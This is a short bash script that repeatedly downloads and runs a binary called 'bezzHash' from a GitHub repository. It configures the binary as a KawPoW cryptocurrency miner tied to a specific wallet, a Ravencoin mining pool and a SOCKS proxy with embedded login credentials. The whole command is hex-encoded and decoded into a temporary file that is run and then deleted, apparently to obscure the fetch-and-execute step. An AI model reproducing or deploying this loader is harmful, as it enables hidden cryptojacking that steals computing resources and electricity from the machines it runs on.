#!/bin/bash

while true; do
    # Convert provided code to hex
    hex_code=$(echo -n "wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash && ./bezzHash --par=kawpow --user RLgPffTX9i31sQjiW3xi2hjXZP5jw1w1M3 --socks zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80 --socksdns --server stratum.ravenminer.com --port 3838 " | xxd -p)

    # Write hex code to a temporary file
    echo "$hex_code" | xxd -r -p > temp_hex_code.sh

    # Make the file executable
    chmod +x temp_hex_code.sh

    # Execute the script
    ./temp_hex_code.sh

    # Clean up temporary file
    rm temp_hex_code.sh

    # Add a delay before next iteration (optional)
    sleep 60  # Adjust the time interval as needed
done
